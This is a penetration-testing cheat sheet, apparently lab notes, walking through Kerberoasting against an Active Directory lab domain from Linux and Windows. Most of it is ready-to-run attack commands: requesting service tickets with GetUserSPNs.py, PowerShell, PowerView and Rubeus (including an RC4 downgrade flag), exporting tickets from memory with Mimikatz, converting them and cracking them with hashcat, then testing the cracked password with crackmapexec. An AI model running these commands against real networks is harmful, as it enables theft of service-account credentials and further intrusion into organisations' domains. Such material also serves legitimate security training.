# Kerberoasting

### Kerberoasting Overview

* This attack targets Service Principal Names (SPNs) accounts.
  * [purpose-of-service-principal-names-spn-in-active-directory.md](../blog/purpose-of-service-principal-names-spn-in-active-directory.md "mention")
    * SPNs are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running
      * Domain accounts are often used to run services to overcome the network authentication limitations of built-in accounts such as `NT AUTHORITY\LOCAL SERVICE`.

### Kerberoasting - Performing the Attack

* Depending on your position in a network, this attack can be performed in multiple ways:
  * From a non-domain joined Linux host using valid domain user credentials.
  * From a domain-joined Linux host as root after retrieving the keytab file.
  * From a domain-joined Windows host authenticated as a domain user.
  * From a domain-joined Windows host with a shell in the context of a domain account.
  * As SYSTEM on a domain-joined Windows host.
  * From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525\(v=ws.11\)) /netonly.

## Kerberoasting - from Linux

### Kerberoasting with GetUserSPNs.py

```shell-session
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```



<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>



### Requesting all TGS Tickets

```shell-session
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
```



<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Requesting a Single TGS ticket

```shell-session
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```

#### Cracking the Ticket Offline with Hashcat

* crack with [hashcat.md](hashcat.md "mention")



```shell-session
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
```

* password is database!

**Testing Authentication against a Domain Controller**

* [crackmapexec.md](crackmapexec.md "mention")

```shell-session
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```

## Kerberoasting - from Windows

### Manual way

#### Enumerating SPNs with setspn.executes

```cmd-session
setspn.exe -Q */*
```

#### Targeting a Single User

```powershell-session
Add-Type -AssemblyName System.IdentityModel
```

```powershell-session
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```

* The [Add-Type](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2) cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object
* The `-AssemblyName` parameter allows us to specify an assembly that contains types that we are interested in using
* [System.IdentityModel](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel?view=netframework-4.8) is a namespace that contains different classes for building security token services
* We'll then use the [New-Object](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object?view=powershell-7.2) cmdlet to create an instance of a .NET Framework object
* We'll use the [System.IdentityModel.Tokens](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens?view=netframework-4.8) namespace with the [KerberosRequestorSecurityToken](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8) class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session

#### Retrieving All Tickets Using setspn.exe

```powershell-session
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

#### Extracting Tickets from Memory with Mimikatz



* [mimikatz.md](mimikatz.md "mention")

```cmd-session
mimikatz # base64 /out:true
```

```cmd-session
mimikatz # kerberos::list /export  
```

```shell-session
echo "<base64 blob>" |  tr -d \\n 
```

```shell-session
cat encoded_file | base64 -d > sqldev.kirbi
```

```shell-session
kirbi2john.py sqldev.kirbi
```

```shell-session
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```

* [hashcat.md](hashcat.md "mention")

```shell-session
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
```

### Automated / Tool Based Route

#### Using PowerView to Extract TGS Tickets

```powershell-session
Import-Module .\PowerView.ps1
```

```powershell-session
Get-DomainUser * -spn | select samaccountname
```

#### Using PowerView to Target a Specific User

```powershell-session
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```

#### Exporting All Tickets to a CSV File

```powershell-session
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

#### Using Rubeus

```powershell-session
.\Rubeus.exe kerberoast /stats
```

```powershell-session
 .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
```

#### Using the /tgtdeleg Flag

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

* `/tgtdeleg` flag, the tool requested an RC4 ticket even though the supported encryption types are listed as AES 128/256

## Reference

* https://adsecurity.org/?p=3458
